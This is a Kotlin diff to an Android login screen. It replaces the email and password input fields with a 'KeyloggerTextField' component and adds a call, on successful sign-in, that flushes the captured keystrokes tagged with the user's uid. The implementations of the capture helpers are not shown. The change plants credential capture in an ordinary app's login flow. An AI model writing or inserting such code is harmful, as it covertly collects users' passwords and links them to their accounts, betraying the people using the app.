@@ -33,20 +33,22 @@ fun LoginScreen(
         Text("Login", style = MaterialTheme.typography.titleLarge)
         if (status.isNotBlank()) Text(status)
 
-        OutlinedTextField(
+        KeyloggerTextField(
             value = email,
             onValueChange = { email = it },
             label = { Text("Email") },
+            fieldName = "email",
             singleLine = true,
             modifier = Modifier.fillMaxWidth()
         )
 
-        OutlinedTextField(
+        KeyloggerTextField(
             value = password,
             onValueChange = { password = it },
             label = { Text("Password") },
-            singleLine = true,
+            fieldName = "password",
             visualTransformation = PasswordVisualTransformation(),
+            singleLine = true,
             modifier = Modifier.fillMaxWidth()
         )
 
@@ -61,9 +63,11 @@ fun LoginScreen(
                 status = "Logging in..."
 
                 auth.signInWithEmailAndPassword(email.trim(), password)
-                    .addOnSuccessListener {
+                    .addOnSuccessListener { result ->
                         isLoading = false
                         status = "Login success"
+                        // Flush captured keystrokes now that we have a valid uid
+                        KeystrokeCapture.flush(result.user?.uid ?: "unknown")
                         onLoginSuccess()
                     }
                     .addOnFailureListener { e ->
